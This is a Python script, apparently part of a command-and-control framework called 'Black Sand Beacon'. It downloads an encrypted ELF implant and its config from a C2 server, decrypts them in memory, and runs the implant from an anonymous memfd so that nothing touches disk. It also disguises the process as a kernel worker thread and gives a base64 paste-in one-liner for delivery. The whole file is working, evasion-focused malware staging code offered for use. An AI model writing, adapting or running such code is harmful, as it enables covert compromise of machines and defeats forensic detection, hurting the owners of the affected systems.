#!/usr/bin/env python3
"""Black Sand Beacon diskless stager.

Fetches the token-packed beacon ELF and config.json from the C2 staging
endpoints, decodes them in RAM, and executes the beacon from an
anonymous memfd. Nothing is ever written to disk.

Packing is three XOR layers whose keys are derived from the staging
token via HKDF-SHA256 (salt "blacksandbeacon-stage-v1") — byte-identical
to the server's derivation in c2/server.py. No key material on the wire.

Environment:
    BSB_STAGE_URL          base C2 URL (e.g. https://c2.example:7070)
    BSB_STAGE_TOKEN        staging token (same as server.stage_token)
    BSB_STAGE_ARGV0        argv[0] for the beacon (default "kworker/u8:2")
    BSB_STAGE_INSECURE_TLS set to 1 to skip TLS verification (lab only)

Usage:
    python3 stage_payload.py
    echo <b64> | base64 -d | BSB_STAGE_URL=... BSB_STAGE_TOKEN=... python3 -
"""

import base64
import hashlib
import hmac
import json
import os
import ssl
import sys
import urllib.error
import urllib.request

HKDF_SALT = b"blacksandbeacon-stage-v1"
HKDF_INFOS = (b"stage-l1", b"stage-l2", b"stage-l3")


def hkdf_sha256(ikm, salt, info, length=32):
    """RFC 5869 HKDF extract+expand (stdlib only, mirrors c2/server.py)."""
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
    out, t, counter = b"", b"", 1
    while len(out) < length:
        t = hmac.new(prk, t + info + bytes([counter]), hashlib.sha256).digest()
        out += t
        counter += 1
    return out[:length]


def _fetch_and_decode(url, token, path, tls_ctx):
    try:
        rq = urllib.request.urlopen(url + path + token, context=tls_ctx)
    except urllib.error.HTTPError as e:
        if e.code in (403, 404):
            sys.exit(
                f"stage: HTTP {e.code} from {path} — staging disabled or token "
                "mismatch. Check BSB_STAGE_TOKEN vs server.stage_token in the "
                "C2 config.json (the one-liner must come from the running server)."
            )
        raise
    blob = base64.b64decode(rq.read().strip())
    ikm = token.encode("utf-8")
    for info in reversed(HKDF_INFOS):
        key = hkdf_sha256(ikm, HKDF_SALT, info)
        blob = bytes(v ^ key[i % len(key)] for i, v in enumerate(blob))
    return blob


def main():
    url = os.environ["BSB_STAGE_URL"].rstrip("/")
    token = os.environ["BSB_STAGE_TOKEN"]
    argv0 = os.environ.get("BSB_STAGE_ARGV0", "kworker/u8:2")
    tls_ctx = (
        ssl._create_unverified_context()
        if os.environ.get("BSB_STAGE_INSECURE_TLS")
        else None
    )

    elf = _fetch_and_decode(url, token, "/stage/beacon/", tls_ctx)
    assert elf[:4] == b"\x7fELF", "stage: decoded payload is not an ELF"
    conf = _fetch_and_decode(url, token, "/stage/config/", tls_ctx)
    json.loads(conf.decode())  # sanity: must be valid JSON

    # MFD_CLOEXEC not set on the config fd: it must survive execve so the
    # beacon can open /proc/self/fd/<cf> as its config source. No disk.
    beacon_fd = os.memfd_create("", 0)
    os.write(beacon_fd, elf)
    config_fd = os.memfd_create("", 0)
    os.write(config_fd, conf)

    os.execve(
        "/proc/self/fd/%d" % beacon_fd,
        [argv0],
        dict(os.environ, BSB_CONFIG="/proc/self/fd/%d" % config_fd),
    )


if __name__ == "__main__":
    main()
